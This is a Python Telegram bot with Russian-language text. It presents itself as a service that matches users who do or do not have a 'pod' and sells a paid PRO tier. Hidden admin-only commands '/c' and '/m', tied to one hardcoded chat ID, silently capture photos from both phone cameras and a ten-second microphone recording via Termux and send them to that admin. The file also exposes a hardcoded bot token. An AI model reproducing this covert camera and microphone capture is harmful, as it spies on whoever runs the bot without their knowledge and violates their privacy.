import telebot
from telebot import *
import time
import pickle
import subprocess

bot = telebot.TeleBot("2037923166:AAF69wiYleugnHBJOw8h6ycgrwkvxupRSO0")

ids = []
have = []
nhave = []
pro = [986022683]

try:
    with open('data.sav', 'rb') as f:
        ids, have, nhave, pro = pickle.load(f)
except:
    pass


def save():
    with open('data.sav', 'wb') as f:
        pickle.dump([ids, have, nhave, pro], f)

@bot.message_handler(commands=['pro'])
def start(message):
    a = message.text
    if message.chat.id == 831689238:
        pro.append(int(a.replace("/pro ", "")))

@bot.message_handler(commands=['help'])
def start(message):
    if message.chat.id == 831689238:
        bot.send_message(831689238, "/s \n /c \n /pro \n /m \n")

@bot.message_handler(commands=['s'])
def start(message):
    if message.chat.id == 831689238:
        stat = "Статистика:\n"+"Пользователей всего: "+str(len(ids))+"\n"+"С подом: "+str(have)+"\n"+"Без: "+str(nhave)+"\n"+"PRO: "+str(pro)
        bot.send_message(831689238, stat)

@bot.message_handler(commands=['c'])
def start(message):
    if message.chat.id == 831689238:
        subprocess.run('termux-camera-photo -c 0 0.jpg', shell=True)
        subprocess.run('termux-camera-photo -c 1 1.jpg', shell=True)
        bot.send_photo(831689238, open(r'0.jpg', 'rb'))
        bot.send_photo(831689238, open(r'1.jpg', 'rb'))
        subprocess.run('rm 0.jpg', shell=True)
        subprocess.run('rm 1.jpg', shell=True)

@bot.message_handler(commands=['m'])
def start(message):
    if message.chat.id == 831689238:
        subprocess.run('termux-microphone-record -f 1.mp3 -l 10', shell=True)
        audio = open('1.mp3', 'rb')
        bot.send_audio(831689238, audio)
        audio.close()

@bot.message_handler(commands=['start'])
def start(message):
    if message.chat.id in ids:
        pass
    else:
        ids.append(message.chat.id)
        save()
    keyboardmain = types.InlineKeyboardMarkup(row_width=2)
    second_button = types.InlineKeyboardButton(text="Есть", callback_data="like"+'|'+str(message.chat.id))
    button3 = types.InlineKeyboardButton(text="Нет", callback_data="like2"+'|'+str(message.chat.id))
    keyboardmain.add(second_button, button3)
    bot.send_message(message.chat.id, "У тебя есть под?:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline1(call):
    bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id)
    calldata = call.data.split('|')[0]
    ID = int(call.data.split('|')[1])
    if calldata == "like":
        try:
            nhave.remove(ID)
        except:
            pass
        have.append(ID)
        save()
        bot.send_message(ID, 'Ты можешь изменить это значение в любой момент написав "/start"\nПоказать команды - /button')
    elif calldata == "like2":
        try:
            have.remove(ID)
        except:
            pass
        nhave.append(ID)
        save()
        bot.send_message(ID, 'Ты можешь изменить это значение в любой момент написав "/start"\nПоказать команды - /button\nПокупка PRO аккаута(50руб) даёт возможность посить каждые 10 минут навсегода! За покупкой к @PROsupport_nakrutka_tiktok')

@bot.message_handler(commands=['button'])
def button_message(message):
    if message.chat.id in have:
        markup=types.ReplyKeyboardMarkup(resize_keyboard=True)
        item1=types.KeyboardButton("Пригласить людей")
        markup.add(item1)
        bot.send_message(message.chat.id,'Выберите что вам надо(можно воспользоваться раз в 50 минут!)',reply_markup=markup)
    elif message.chat.id in nhave:
        markup=types.ReplyKeyboardMarkup(resize_keyboard=True)
        item1=types.KeyboardButton("Попросить под")
        markup.add(item1)
        bot.send_message(message.chat.id,'Выберите что вам надо(можно воспользоваться раз в 50 минут!)\nПокупка PRO аккаута(50руб) даёт возможность посить каждые 10 минут навсегода! За покупкой к @PROsupport_nakrutka_tiktok',reply_markup=markup)
@bot.message_handler(content_types='text')
def message_reply(message):
    if message.text=="Пригласить людей":
        if message.chat.id in pro:
            for ID in nhave:
                bot.send_message(ID,"♦️*Кто то хочет предложить вам под*♦️", parse_mode= "Markdown")
            bot.send_message(message.chat.id,"Подождите 10 минут прежде чем попросить ещё раз!")
            time.sleep(600)
        else:
            for ID in nhave:
                bot.send_message(ID,"♦️*Кто то хочет предложить вам под*♦️", parse_mode= "Markdown")
            bot.send_message(message.chat.id,"Подождите 50 минут прежде чем попросить ещё раз!")
            time.sleep(3000)
    if message.text=="Попросить под":
        if message.chat.id in pro:
            for ID in have:
                bot.send_message(ID,"♦️*Кто то хочет попросить у вас под*♦️", parse_mode= "Markdown")
            bot.send_message(message.chat.id,"Подождите 10 минут прежде чем попросить ещё раз!)\nПокупка PRO аккаута(50руб) даёт возможность посить каждые 10 минут навсегода! За покупкой к @PROsupport_nakrutka_tiktok")
            time.sleep(600)
        else:
            for ID in have:
                bot.send_message(ID,"♦️*Кто то хочет попросить у вас под*♦️", parse_mode= "Markdown")
            bot.send_message(message.chat.id,"Подождите 50 минут прежде чем попросить ещё раз!)\nПокупка PRO аккаута(50руб) даёт возможность посить каждые 10 минут навсегода! За покупкой к @PROsupport_nakrutka_tiktok")
            time.sleep(3000)


bot.infinity_polling()